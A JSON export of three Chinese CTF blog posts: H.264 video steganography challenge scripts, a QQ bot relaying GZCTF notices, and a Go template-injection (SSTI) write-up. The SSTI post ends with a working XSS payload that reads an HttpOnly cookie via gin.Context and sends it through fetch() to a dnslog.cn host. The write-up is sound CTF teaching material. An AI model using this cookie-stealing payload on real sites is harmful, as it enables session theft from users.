[{"title":"H264编码分析及隐写实践","path":"/2024/04/29/H264编码分析及隐写实践/","content":"H264编码分析及隐写实践目录 1 视频数据层级 2 H264裸流 3 NALU 4 RBSP 4.1 指数哥伦布熵编码 5 NALU种类 6 实践 6.1 修改IDR帧类型 6.2 修改其他帧类型 6.3 重新封装 6.4 修复 7 总结 8 参考 CTF竞赛中经常出现图片隐写，视频作为更高量级的信息载体，应当有更大的隐写空间。本文就简单介绍一下H264编码以及一次校赛相关出题经历。 1 视频数据层级平常我们生活中遇到的大部分是FLV、AVI等等的视频格式，但实际上这只是一种封装，实际的数据还是要看视频的编码，就比如H264。像我们平时在视频网站看到的视频就是通过HTTP协议传输的，直播则是RTMP协议，协议承载的一般是封装后的视频数据。 下图就很好的展示了视频数据的各个层级。 2 H264裸流得到最原始的视频数据，需要提取H264裸流。 简单介绍一下ffmpeg的用法，不指定格式的情况下，ffmpeg会识别给定文件名的后缀自动进行转换，比如 1ffmpeg input.flv output.mp4 就会自动转换为mp4 如何提取一个H264编码的视频裸流呢。 使用以下命令。 1ffmpeg -vcodec copy -i input.flv output.h264 默认不加参数的情况，ffmpeg会把视频重新编码，视频数据会发生变化，所以要加上-vcodec copy，指示ffmpeg直接复制视频流，而不是重新编码。 这样得到的h264裸流就是封装格式中的原始数据。 有了H264裸流，可以使用https://github.com/latelee/H264BSAnalyzerhttps://github.com/latelee/H264BSAnalyzer的工具查看裸流信息。 3 NALUH.264裸流是由⼀个接⼀个NALU组成。H264对NALU的封装有两种方式，一种是AnnexB，一种是 avcC。 这里仅介绍AnnexB，对avcC感兴趣的可以看https://www.zzsin.com/article/avc_1_annex_b.htmlhttps://www.zzsin.com/article/avc_1_annex_b.html。 AnnexB的封装很简单，以00 00 00 01或者00 00 01开头作为一个新NALU的标志，为了防止竞争，即 NALU数据中出现00 00 00 01导致解码器误认为是一个新的NALU，所以采用了一些防竞争的策略。 123400 00 00 =&gt; 00 00 03 0000 00 01 =&gt; 00 00 03 0100 00 02 =&gt; 00 00 03 0200 00 03 =&gt; 00 00 03 03 看一眼下面的图就很清楚了。 那么也就是说当我们把数据从H264裸流中提取出来之后，还需要对防竞争字节进行还原。 这里的话对这些类型的数据有些定义，详细可以去看https://www.zzsin.com/article/avc_3_5_rbsp.htmlhttps://www.zzsin.com/article/avc_3_5_rbsp.html。 NALU：去除00 00 00 01标志符的数据 EBSP：去除NALU header（通常是第一个字节）但未还原防竞争字节的数据 RBSP：将EBSP还原防竞争字节后的数据 12345678一段AnnexB封装的NALU: 00 00 00 01 67 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 03 00 80 00 00 1E 07 8C 18 CBNALU: 67 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 03 00 80 00 00 1E 07 8C 18 CBEBSP: 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 03 00 80 00 00 1E 07 8C 18 CBRBSP: 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 00 80 00 00 1E 07 8C 18 CB 4 RBSP现在有了NALU数据，我们就可以对着https://www.itu.int/rec/T-REC-H.264-202108-I/enhttps://www.itu.int/rec/T-REC-H.264-202108-I/en上的内容来一步步解码了。 直接看到手册7.3节，这里是表格式的语法，右边的Descriptor描述了数据的格式及占用的bit数，比如第一个f(1)表示1bit fixed-pattern bit string。 可以在7.2节找到所有的Descriptor定义 还是拿之间的数据做例子 1267 64 00 1F AC D9 40 50 05 BB 01 6A 02 02 02 80 00 00 00 80 00 00 1E 07 8C 18 CB 第一个字节为0b01100111（这部分称为NALU header），那么 1234forbidden_zero_bit= (byte &gt;&gt; 7) &amp; 0x1 = 0nal_ref_idc = (byte &gt;&gt; 5) &amp; 0x3 = 3nal_unit_type = byte &amp; 0x1F = 7 有了nal_unit_type，可以在7.4节的Table 7-1找到对应的类型和对RBSP数据的解析。 4.1 指数哥伦布熵编码在Descriptor中有以下几种特殊的编码 无符号指数哥伦布熵编码 ue(v) 有符号指数哥伦布熵编码 se(v) 映射指数哥伦布熵编码 me(v) 截断指数哥伦布熵编码 te(v) 这部分建议跟着https://www.bilibili.com/video/BV1V3411m7xK/?spm_id_from=333.788\\&vd_source=de47681dd68ed49471df89ada190d371https://www.bilibili.com/video/BV1V3411m7xK/?spm_id_from=333.788\\&vd_source=de47681dd68ed49471df89ada190d371来自己复现一下。 5 NALU种类NALU种类有很多，简单介绍几个重要的 SPS（Sequence Paramater Set）：序列参数集， 包括一个图像序列的所有信息，如图像尺寸、视频格式等。 PPS（Picture Paramater Set）：图像参数集，包括一个图像的所有分片的所有相关信息，包括图像类型、序列号等。 在传输视频流之前，必须要传输这两类参数，不然无法解码。为了保证容错性，每一个 I 帧前面，都会传一遍这两个参数集合。 一个流由多个帧序列组成，一个序列由以下三种帧组成。 I帧（Intra-coded picture帧内编码图像帧）：不参考其他图像帧，只利⽤本帧的信息进⾏编码。 P帧（Predictive-codedPicture预测编码图像帧）：利⽤之前的I帧或P帧，采⽤运动预测的⽅式进⾏帧间预测编码。 B帧（Bidirectionallypredicted picture双向预测编码图像帧）：提供最⾼的压缩⽐，它既需要之前的图像帧(I帧或P帧)，也需要后来的图像帧(P帧)，采⽤运动预测的⽅式进⾏帧间双向预测编码。 这些个帧组成一个序列，每个序列的第一个帧是IDR帧 IDR（Instantaneous Decoding Refresh，即时解码刷新）：⼀个序列的第⼀个图像叫做 IDR 图像（⽴即刷新图像），IDR 图像都是 I 帧图像。 IDR帧必须是I帧，但是I帧可以不是IDR帧。 其他 SEI（Supplemental Enhancement Information辅助增强信息）：SEI是H264标准中一个重要的技术，主要起补充和增强的作用。 SEI没有图像数据信息，只是对图像数据信息或者视频流的补充，有些内容可能对解码有帮助. 6 实践在BUAACTF2024中出了一道H264编码的视频题，思路如下。 首先有一个正常的带flag的视频 希望把视频损坏，但是是可修复的损坏。 首先用ffmpeg重新编码一下，不然太清晰裸流的文件大小很大 1os.system(&#x27;ffmpeg -i flag.mp4 -c:v libx264 -crf 18 -preset medium -c:a aac -b:a 128k encode-origin.h264 &#x27;) 并生成一个H264裸流文件，接下来就是对H264裸流进行操作。 python中操作H264裸流可以用https://github.com/slhck/h26x-extractorhttps://github.com/slhck/h26x-extractor库 1234H26xParser = H26xParser(ORIGIN_H264, verbose=False)H26xParser.parse()nalu_list = H26xParser.nalu_pos nalu_pos方法 返回的是一个元组列表，前两个表示的是nalu数据的开始字节和结束字节 然后获取rbsp数据，用getRSBP方法，这个方法返回的数据是包含NALU头部的。 123456for tu in nalu_list: start, end, _, _, _, _ = tu rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F nalu_body = rbsp[1:] 6.1 修改IDR帧类型前面提到，IDR帧的类型必须是I帧，所以可以将他的类型进行改变。改变IDR帧的帧类型 12if nal_unit_type == 5: origin_data[start + 1] = origin_data[start + 1] | 0x4 # 把关键帧slice_type改为11 nal_unit_type == 5意味着这是一个IDR帧，然后看IDR的解析语法 找到slice_layer_without_partitioning_rbsp() 找到slice_header() ue(v)就是我们前面提到的无符号指数哥伦布编码。 来看看如何使用无符号指数哥伦布进行编码： 先把要编码的数字加 1，假设我们要编码的数字是 4，那么我们先对 4 加 1，就是 5。 将加 1 后的数字 5 先转换成二进制，就是： 101。 转化成二进制之后，我们看转化成的二进制有多少位，然后在前面补位数减一个 0 。例如，101 有 3 位，那么我们应该在前面补两个 0。 最后，4 进行无符号指数哥伦布编码之后得到的二进制码流就是 0 0 1 0 1。 而前面的first_mb_in_slice表示该slice的第一个宏块在图像中的位置，涉及到一些更深入的知识，但是这里不用关心，因为我们的情况中first_mb_in_slice始终为0。 slice_type就是我们的帧类型，同样在7.4节给出了不同类型对应的值。 观察我们正常的h264裸流，这个slice_type的值都是被设置为7。 所以从RBSP的第一个字节开始，0的无符号指数哥伦布熵编码是0b1，7的无符号指数哥伦布熵编码是0b0001000，比特流应当是 10b 1 0001000 xxxxxxx 找一个IDR帧的数据来验证一下 100 00 01 65 88 84 00 6F F9 C3 AB 0F 3B E0 BC 1E 03 54 39 CD 48 64 95 22 F4 6E AA 45 2F E6 8A 4F A2 1D 61 88 5C B2 0F 61 41 11 81 69 27 E5 93 DE D3 15 0D A2 97 F7 9A 41 E7 DF D5 B0 BD 50 57 D9 30 65 42 D9 RBSP为 188 84 00 ..... 88恰好对应0b10001000 所以我直接对这个字节byte | 0x4，让这个字节变成0b10001100，于是slice_type就变成了11。这里主要是为了好处理数据，所以直接用二进制运算，实际上slice_type想改多少都可以。 修改后IDR的信息如下 6.2 修改其他帧类型关于其他帧类型的修改，题目是将所有帧类型都改为B帧，然后记录下原来的帧类型，存放在每个IDR帧之后的SEI帧里，供后续修复。 12345if nal_unit_type == 1: #修改slice slice_type = extract_slice_type(nalu_body) origin_slice_type_list.append(SLICE_TYPES[slice_type % 5]) print(SLICE_TYPES[slice_type % 5], end=&#x27; &#x27;) origin_data[start + 1] = origin_data[start + 1] | 0x4 # 非关键帧全部变为B帧 效果如下 SEI内容 6.3 重新封装由于ffmpeg的转换会重新编码，所以还是一样要加上-vcodec copy参数，使其不重新编码，而是只做封装。 12os.system(f&quot;ffmpeg -i &#123;OUTPUT_H264&#125; -vcodec copy &#123;OUTPUT_MP4&#125;&quot;) 最后的视频成了这样 放出完整的出题脚本，只需要修改FLAG_VIDEO就可以生成。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114import osfrom h26x_extractor.h26x_parser import H26xParserfrom uuid import uuid4SLICE_TYPES = &#123;0: &#x27;P&#x27;, 1: &#x27;B&#x27;, 2: &#x27;I&#x27;, 3: &#x27;SP&#x27;, 4: &#x27;SI&#x27;&#125;FLAG_VIDEO = &#x27;flag.mp4&#x27;ORIGIN_H264=&#x27;encode-origin.h264&#x27;OUTPUT_H264=&#x27;encode-new.h264&#x27;OUTPUT_MP4=&#x27;encode-output.mp4&#x27;OUTPUT_FLV=&#x27;encode-output.flv&#x27;class BitStream: def __init__(self, buf): self.buffer = buf self.bit_pos = 0 self.byte_pos = 0 def ue(self): count = 0 while self.u(1) == 0: count += 1 res = ((1 &lt;&lt; count) | self.u(count)) - 1 return res def u1(self): self.bit_pos += 1 res = self.buffer[self.byte_pos] &gt;&gt; (8 - self.bit_pos) &amp; 0x01 if self.bit_pos == 8: self.byte_pos += 1 self.bit_pos = 0 return res def u(self, n: int): res = 0 for i in range(n): res &lt;&lt;= 1 res |= self.u1() return resdef extract_slice_type(nalu_body): body = BitStream(nalu_body) #print(nalu_body[:3]) first_mb_in_slice = body.ue() slice_type = body.ue() return slice_typedef generate_sequence_data(origin_slice_type_list: list): sei_data = b&#x27;\\x00\\x00\\x01\\x06\\x05&#x27; sei_payload_len = len(origin_slice_type_list) + 16 uuid = uuid4().bytes while sei_payload_len &gt; 255: sei_payload_len -= 255 sei_data += b&#x27;\\xFF&#x27; sei_payload = uuid + &#x27;&#x27;.join(origin_slice_type_list).encode() sei_data += int.to_bytes(sei_payload_len, 1, &#x27;big&#x27;) sei_data += sei_payload sei_data += b&#x27;\\x80&#x27; return sei_dataif __name__ == &#x27;__main__&#x27;: os.system(f&#x27;ffmpeg -i &#123;FLAG_VIDEO&#125; -c:v libx264 -crf 18 -preset medium -c:a aac -b:a 128k &#123;ORIGIN_H264&#125;&#x27;) f = open(ORIGIN_H264, &#x27;rb&#x27;) origin_data = list(f.read()) f.close() # 进行加密 H26xParser = H26xParser(ORIGIN_H264, verbose=False) H26xParser.parse() nalu_list = H26xParser.nalu_pos print(nalu_list) data = H26xParser.byte_stream origin_slice_type_list = [] sei_data_list = [] for tu in nalu_list: start, end, _, _, _, _ = tu rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F nalu_body = rbsp[1:] if nal_unit_type == 1: #修改slice slice_type = extract_slice_type(nalu_body) origin_slice_type_list.append(SLICE_TYPES[slice_type % 5]) print(SLICE_TYPES[slice_type % 5], end=&#x27; &#x27;) origin_data[start + 1] = origin_data[start + 1] | 0x4 # 非关键帧全部变为B帧 elif nal_unit_type == 5: origin_data[start + 1] = origin_data[start + 1] | 0x4 # 把关键帧slice_type改为11 elif nal_unit_type == 7 and origin_slice_type_list: sei_data_list.append(generate_sequence_data(origin_slice_type_list)) origin_slice_type_list = [] sei_data_list.append(generate_sequence_data(origin_slice_type_list)) # 构造新数据 origin_slice_type_list = [] new_data = b&#x27;&#x27; start_pos = 0 count = 0 for start, end, _, _, _, _ in nalu_list: rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F if nal_unit_type == 5: new_data += bytes(origin_data[start_pos:end]) + sei_data_list[count] count += 1 start_pos = end new_data += bytes(origin_data[start_pos:]) # 输出 f = open(OUTPUT_H264, &#x27;wb&#x27;) f.write(bytes(new_data)) f.close() # 封装 os.system(f&quot;ffmpeg -i &#123;OUTPUT_H264&#125; -vcodec copy &#123;OUTPUT_MP4&#125;&quot;) os.system(f&quot;ffmpeg -i &#123;OUTPUT_MP4&#125; -vcodec copy &#123;OUTPUT_FLV&#125;&quot;) 6.4 修复理解了出题思路，解题就比较简单。将EXTRACT_VIDEO修改为损坏的视频即可。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697import osfrom h26x_extractor.h26x_parser import H26xParserfrom uuid import uuid4SLICE_TYPES = &#123;0: &#x27;P&#x27;, 1: &#x27;B&#x27;, 2: &#x27;I&#x27;, 3: &#x27;SP&#x27;, 4: &#x27;SI&#x27;&#125;EXTRACT_VIDEO = &#x27;final/extract.flv&#x27;ORIGIN_H264 = &#x27;decode-extract.h264&#x27;OUTPUT_H264 = &#x27;decode-origin.h264&#x27;OUTPUT_MP4 = &#x27;decode-origin.mp4&#x27;class BitStream: def __init__(self, buf): self.buffer = buf self.bit_pos = 0 self.byte_pos = 0 def ue(self): count = 0 while self.u(1) == 0: count += 1 res = ((1 &lt;&lt; count) | self.u(count)) - 1 return res def u1(self): self.bit_pos += 1 res = self.buffer[self.byte_pos] &gt;&gt; (8 - self.bit_pos) &amp; 0x01 if self.bit_pos == 8: self.byte_pos += 1 self.bit_pos = 0 return res def u(self, n: int): res = 0 for i in range(n): res &lt;&lt;= 1 res |= self.u1() return resdef extract_slice_type(nalu_body): body = BitStream(nalu_body) #print(nalu_body[:3]) first_mb_in_slice = body.ue() slice_type = body.ue() return slice_typedef read_sei(nalu_body): payload_type = nalu_body[0] payload_size = 0 i = 1 while nalu_body[i] == 0xff: payload_size+=255 i+=1 payload_size += nalu_body[i] return [chr(i) for i in nalu_body[i+1+16:i+1+payload_size]]if __name__ == &#x27;__main__&#x27;: os.system(f&#x27;ffmpeg -i &#123;EXTRACT_VIDEO&#125; -vcodec copy &#123;ORIGIN_H264&#125;&#x27;) f = open(ORIGIN_H264, &#x27;rb&#x27;) origin_data = list(f.read()) f.close() # 进行解密 H26xParser = H26xParser(ORIGIN_H264, verbose=False) H26xParser.parse() nalu_list = H26xParser.nalu_pos data = H26xParser.byte_stream origin_slice_type_list = [] prev_unit_type = 0 count=0 for tu in nalu_list: start, end, _, _, _, _ = tu rbsp = bytes(H26xParser.getRSBP(start, end)) nalu_header = rbsp[0] nal_unit_type = nalu_header &amp; 0x1F nalu_body = rbsp[1:] if nal_unit_type == 1: #修改slice if origin_slice_type_list[count]==&#x27;P&#x27;: origin_data[start + 1] = origin_data[start + 1] ^ 0x4 elif nal_unit_type == 5: origin_data[start + 1] = origin_data[start + 1] ^ 0x4 elif nal_unit_type == 6 and prev_unit_type == 5: count=0 print(read_sei(nalu_body)) origin_slice_type_list = read_sei(nalu_body) prev_unit_type = nal_unit_type new_data = bytes(origin_data) # 输出 f = open(OUTPUT_H264, &#x27;wb&#x27;) f.write(bytes(new_data)) f.close() # 封装 os.system(f&quot;ffmpeg -i &#123;OUTPUT_H264&#125; -vcodec copy &#123;OUTPUT_MP4&#125;&quot;) 7 总结关于视频编码的隐写还有很多待发掘的地方，本文仅抛砖引玉，比如YUV像素信息就可以尝试LSB隐写。希望对你有些启发。 8 参考https://zhuanlan.zhihu.com/p/409527359https://zhuanlan.zhihu.com/p/409527359 https://zhuanlan.zhihu.com/p/419901787?utm_id=0https://zhuanlan.zhihu.com/p/419901787?utm_id=0 https://github.com/yistLin/H264-Encoder/blob/master/doc/ITU-T%20H.264.pdfhttps://github.com/yistLin/H264-Encoder/blob/master/doc/ITU-T%20H.264.pdf https://www.itu.int/rec/T-REC-H.264-202108-I/enhttps://www.itu.int/rec/T-REC-H.264-202108-I/en https://www.zzsin.com/article/avc_0_5_what_is_nalu.htmlhttps://www.zzsin.com/article/avc_0_5_what_is_nalu.html https://github.com/slhck/h26x-extractorhttps://github.com/slhck/h26x-extractor","tags":["ctf","2024","h264"],"categories":["Study"]},{"title":"GZCTF平台对接QQ机器人","path":"/2024/04/23/GZCTF平台对接QQ机器人/","content":"GZCTF平台对接QQ机器人本文章写于2024-04-23，不保证后续可用性。 参考 https://github.com/mamoe/miraihttps://github.com/mamoe/mirai https://qchatgpt.rockchin.top/posts/deploy/platforms/mirai.html#安装-mirai-api-httphttps://qchatgpt.rockchin.top/posts/deploy/platforms/mirai.html#安装-mirai-api-http 采用mirai项目 安装mirai用mirai-installer安装 https://github.com/iTXTech/mcl-installerhttps://github.com/iTXTech/mcl-installer 安装 1./mcl-installer 初始化 1./mcl 安装完毕 插件安装及配置mirai-http-api插件用于开放接口 https://github.com/project-mirai/mirai-api-httphttps://github.com/project-mirai/mirai-api-http 打开mcl后输入 1mcl --update-package net.mamoe:mirai-api-http --channel stable-v2 --type plugin 即可安装成功 配置文件setting.yml 123456789101112131415161718192021222324252627282930313233343536373839## 配置文件中的值，全为默认值## 启用的 adapter, 内置有 http, ws, reverse-ws, webhookadapters: - http - ws## 是否开启认证流程, 若为 true 则建立连接时需要验证 verifyKey## 建议公网连接时开启enableVerify: true verifyKey: 1234567890 ## 开启一些调试信息debug: false## 是否开启单 session 模式, 若为 true，则自动创建 session 绑定 console 中登录的 bot## 开启后，接口中任何 sessionKey 不需要传递参数## 若 console 中有多个 bot 登录，则行为未定义## 确保 console 中只有一个 bot 登录时启用singleMode: false## 历史消息的缓存大小## 同时，也是 http adapter 的消息队列容量cacheSize: 4096## adapter 的单独配置，键名与 adapters 项配置相同adapterSettings: ## 详情看 http adapter 使用说明 配置 http: host: localhost port: 8080 cors: [&quot;*&quot;] unreadQueueMaxSize: 100 ## 详情看 websocket adapter 使用说明 配置 ws: host: localhost port: 8080 reservedSyncId: -1 采用http，verifykey是后续用于认证的。如若使用Docker开放端口，host要改为0.0.0.0，不然访问不到。 我的配置 1234567891011121314151617adapters: - httpenableVerify: trueverifyKey: 1234567890debug: falsesingleMode: falsecacheSize: 4096adapterSettings: http: host: 0.0.0.0 port: 7777 cors: [&quot;*&quot;] unreadQueueMaxSize: 100 loginsolver插件用于登录，拖入plugins即可 https://github.com/KasukuSakura/mirai-login-solver-sakurahttps://github.com/KasukuSakura/mirai-login-solver-sakura 需要用到22333端口，docker中记得开放，登录时会返回地址，需要用手机下载Sakuralogin来输入地址登录。 签名服务器Qsign https://github.com/MrXiaoM/qsignhttps://github.com/MrXiaoM/qsign 下载时下载d62ddce版本，将plugins中的jar放到bot的plugins中，将txlib放到bot的根目录即可。 要修改配置文件中的协议版本为8.9.90 配置即可完成 运行运行mcl 1./mcl 使用内置命令登录，最好使用ANDROID_PAD，手表协议发20条就会风控。 1/login qq password ANDROID_PAD 登录完之后可以设置autoLogin，具体不赘述。 使用使用的什么adapter就看什么，详细描述了api接口 https://docs.mirai.mamoe.net/mirai-api-http/adapter/HttpAdapter.htmlhttps://docs.mirai.mamoe.net/mirai-api-http/adapter/HttpAdapter.html 简单实现的一个python bot类，抛砖引玉，还可以继续扩展。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsVERIFY_KEY = &#x27;&#x27;BOT_URL = &#x27;http://x.x.x.x:7777&#x27;class Bot: def __init__(self, verify_key: str, url: str, qq: str): self.verify_key = verify_key self.url = url self.qq = qq self.session = self.verify() self.bind() def verify(self): url = f&#x27;&#123;self.url&#125;/verify&#x27; data = &#123;&quot;verifyKey&quot;: self.verify_key&#125; req = requests.post(url, json=data) return req.json()[&#x27;session&#x27;] def bind(self): url = f&#x27;&#123;self.url&#125;/bind&#x27; data = &#123;&quot;sessionKey&quot;: self.session, &#x27;qq&#x27;: self.qq&#125; req = requests.post(url, json=data) return req.json()[&#x27;msg&#x27;] def rebind(self): # 由于30分钟不使用就会过期，所以要重新绑定。 self.session = self.verify() self.bind() def get_group_list(self): self.check_session() url = f&#x27;&#123;self.url&#125;/groupList?sessionKey=&#123;self.session&#125;&#x27; rep = requests.get(url) return rep.json() def check_session(self): # 检测session是否过期 url = f&#x27;&#123;self.url&#125;/sessionInfo?sessionKey=&#123;self.session&#125;&#x27; rep = requests.get(url) if rep.json()[&#x27;code&#x27;] == 3: self.rebind() return def send_group_message(self, id: int, message: str): self.check_session() url = f&#x27;&#123;self.url&#125;/sendGroupMessage&#x27; data = &#123;&quot;sessionKey&quot;: self.session, &#x27;target&#x27;: id, &#x27;messageChain&#x27;: [ &#123;&quot;type&quot;: &quot;Plain&quot;, &quot;text&quot;: message&#125;, ]&#125; req = requests.post(url, json=data) return req.json()[&#x27;msg&#x27;]if __name__ == &#x27;__main__&#x27;: bot = Bot(VERIFY_KEY, BOT_URL, &#x27;0000000000&#x27;) print(bot.get_group_list()) print(bot.send_group_message(0000000000, &#x27;123123&#x27;)) 对接GZCTF平台 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172import timefrom datetime import timezone, timedeltaimport requestsfrom dateutil.parser import isoparsefrom bot import Botimport loggingfrom rich.logging import RichHandlerfrom rich.status import StatusINTERVAL = 2 # 间隔时间FORMAT = &quot;%(message)s&quot;VERIFY_KEY = &#x27;&#x27; # mirai-http-api verify keyBOT_URL = &#x27;http://0.0.0.0:7777&#x27; # mirai-http-api bot urlBOT_QQ = &#x27;&#x27; # bot qq号GROUP_NOTICE_ID = &#x27;&#x27; # 发送的群号BOT = Bot(VERIFY_KEY, BOT_URL, BOT_QQ)API_URL = &#x27;http://0.0.0.0/api/game/4/notices&#x27; # 比赛通知apiBANNER = &#x27;&#x27;NOW_ID = 0TEMPLATES = &#123; &#x27;Normal&#x27;: &#x27;【比赛公告】 内容：%s 时间：%s&#x27;, &#x27;NewChallenge&#x27;: &#x27;【新增题目】 [%s] 时间：%s&#x27;, &#x27;NewHint&#x27;: &#x27;【题目提示】 [%s]有新提示，请注意查收 时间：%s&#x27;, &#x27;FirstBlood&#x27;: &#x27;【一血播报】 恭喜%s拿下[%s]一血 时间：%s&#x27;, &#x27;SecondBlood&#x27;: &#x27; 【二血播报】 恭喜%s拿下[%s]二血 时间：%s&#x27;, &#x27;ThirdBlood&#x27;: &#x27; 【三血播报】 恭喜%s拿下[%s]三血 时间：%s&#x27;&#125;def processTime(t): t_truncated = t[:26] + t[26:].split(&#x27;+&#x27;)[0] input_time = isoparse(t_truncated) input_time_utc = input_time.replace(tzinfo=timezone.utc) beijing_timezone = timezone(timedelta(hours=8)) beijing_time = input_time_utc.astimezone(beijing_timezone) return beijing_time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;)if __name__ == &#x27;__main__&#x27;: logging.basicConfig( level=logging.INFO, format=FORMAT, datefmt=&quot;[%X]&quot;, handlers=[RichHandler()] ) log = logging.getLogger(&quot;rich&quot;) notices = requests.get(API_URL).json() notices = sorted(notices, key=lambda x: x[&#x27;id&#x27;]) NOW_ID = notices[-1][&#x27;id&#x27;] #NOW_ID -= 1 status = Status(&#x27;Waiting for new notice&#x27;) status.start() while True: try: notices = requests.get(API_URL).json() except KeyboardInterrupt: log.info(&#x27;Exit bot&#x27;) break except Exception: log.warning(&#x27;Warning: request failed&#x27;) continue notices = sorted(notices, key=lambda x: x[&#x27;id&#x27;]) for notice in notices: if notice[&#x27;id&#x27;] &gt; NOW_ID: message = TEMPLATES[notice[&#x27;type&#x27;]] % tuple(notice[&#x27;values&#x27;] + [processTime(notice[&#x27;time&#x27;])]) log.info(f&#x27;sending to &#123;GROUP_NOTICE_ID&#125; message: &#123;message&#125;&#x27;) BOT.send_group_message(GROUP_NOTICE_ID, message) NOW_ID = notice[&#x27;id&#x27;] try: time.sleep(INTERVAL) except KeyboardInterrupt: log.info(&#x27;Exit bot&#x27;) break status.stop() 还是挺稳的。","tags":["qqbot","ctf","2024","config"],"categories":["Config"]},{"title":"简析Go SSTI利用","path":"/2024/03/22/简析Go SSTI利用/","content":"简析Go SSTI利用目录 Go SSTI基础 模版渲染 Action Pipelines Variable gin.context的利用方式 Hgame2024 Week2 梅开二度 总结 Go ssti的xss利用 简单来说就是可以利Go的模版注入，来绕过Cookie的HTTPOnly安全限制 Go SSTI基础参考go官方文档 https://pkg.go.dev/text/templatehttps://pkg.go.dev/text/template 模版渲染go的模版渲染使用的是&#123;&#123;&#125;&#125; 简单的例子 123456789type Inventory struct &#123; Material string Count uint&#125;sweaters := Inventory&#123;&quot;wool&quot;, 17&#125;tmpl, err := template.New(&quot;test&quot;).Parse(&quot;&#123;&#123;.Count&#125;&#125; items are made of &#123;&#123;.Material&#125;&#125;&quot;)if err != nil &#123; panic(err) &#125;err = tmpl.Execute(os.Stdout, sweaters)if err != nil &#123; panic(err) &#125; 可以看到17和wool被渲染进去了。 Action官方的给出的Action如下 123456789101112131415161718192021222324252627282930313233&#123;&#123;/* a comment */&#125;&#125;&#123;&#123;- /* a comment with white space trimmed from preceding and following text */ -&#125;&#125;&#123;&#123;pipeline&#125;&#125; 我们可以把pipeline视作函数或者某个属性值 &#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125;&#123;&#123;if pipeline&#125;&#125; T1 &#123;&#123;else if pipeline&#125;&#125; T0 &#123;&#123;end&#125;&#125;&#123;&#123;range pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125;&#123;&#123;range pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125; 当pipeline返回的array长度为0时，执行T0 &#123;&#123;break&#125;&#125;&#123;&#123;continue&#125;&#125;&#123;&#123;template &quot;name&quot;&#125;&#125; 渲染名称为name的模版。&#123;&#123;template &quot;name&quot; pipeline&#125;&#125; 以pipeline为name模版的传入数据。&#123;&#123;block &quot;name&quot; pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125; block是定义template的一种速记，相当于定义并执行，上面这条就是将pipeline渲染到T1模版里，并定义T1为名称为name的模版，相当于以下两条的结合。 &#123;&#123;define &quot;name&quot;&#125;&#125; T1 &#123;&#123;end&#125;&#125; &#123;&#123;template &quot;name&quot; pipeline&#125;&#125; 典型的用法是定义一组根模版，然后通过block重新定义来定制这些模板。&#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;end&#125;&#125; 如果管道值为空，则不产生输出；否则，dot 将被设置为管道值，T1 将被执行。 &#123;&#123;with pipeline&#125;&#125; T1 &#123;&#123;else&#125;&#125; T0 &#123;&#123;end&#125;&#125; 如果管道值为空，dot不受影响，T0会被执行；否则，dot会被设置为pipeline的值，T1 会被执行。 with和if的区别在于with会将返回值储存在&quot;.&quot;中，后续可以访问。 举一个with的例子 1tmpl, err := template.New(&quot;test&quot;).Parse(&quot;&#123;&#123;with .Count&#125;&#125;&#123;&#123;.&#125;&#125; items are made of &#123;&#123;end&#125;&#125;&#123;&#123;.Material&#125;&#125;&quot;) Pipelines123456Argument 参数.Method [Argument...] 方法functionName [Argument...] 函数 pipeline之间可以用管道连接符|来连接，前者的返回值将作为后者的最后一个参数传递 VariableAction内的pipelin可以初始化变量的值 123$variable := pipelinerange $index, $element := pipeline gin.context的利用方式参考go文档 https://pkg.go.dev/github.com/gin-gonic/ginhttps://pkg.go.dev/github.com/gin-gonic/gin 看其Context下的属性和函数即可 简单选几个说明一下，具体的可以看官方文档 func 描述 ClientIP 返回访问ip ContentType contenttype Cookie 返回Cookie，这里就是XSS可以利用的地方，因为这里的Cookie是无视httponly的属性， Query 查询请求中的参数，比如请求传参为?a=123&amp;b=456，那么Query(&#39;a&#39;)返回的是&#39;123&#39; Hgame2024 Week2 梅开二度实现xss，cookie被设置为了httponly 可以用Cookie访问到这个httponly的flag 而且这个机器人什么都不会返回，所以需要外带 先写一个iframe，让机器人访问到&#x2F;flag获取cookie，等获取完之后再加载一个iframe，把数据发送出去 最终未编码的payload如下 12345678910111213141516?tmpl=&#123;&#123;print 1|.Query&#125;&#125;&amp;1=&lt;iframe src=&quot;http://127.0.0.1:8099/flag&quot; id=2&gt;&lt;/iframe&gt;&lt;script&gt;function a()&#123; var iframe=document.createElement(&quot;iframe&quot;) iframe.src=&quot;http://127.0.0.1:8099/?tmpl=&#123;&#123;print 2|.Query|.Cookie&#125;&#125;&amp;2=flag&quot; iframe.onload=function()&#123; var str=iframe.contentWindow.document.body.innerHTML.slice(59,-7) var flag=&quot;&quot; for(var i=0;i&lt;str.length;i++)&#123; flag+=str.charCodeAt(i).toString(16) &#125; fetch(&quot;http://&quot;+flag+&quot;nice.dj30m9.dnslog.cn&quot;)&#125;document.body.appendChild(iframe)&#125;document.getElementById(&#x27;2&#x27;).onload=a //用onload保证第一个iframe加载完成之后再加载第二个iframe发送cookie&lt;/script&gt; 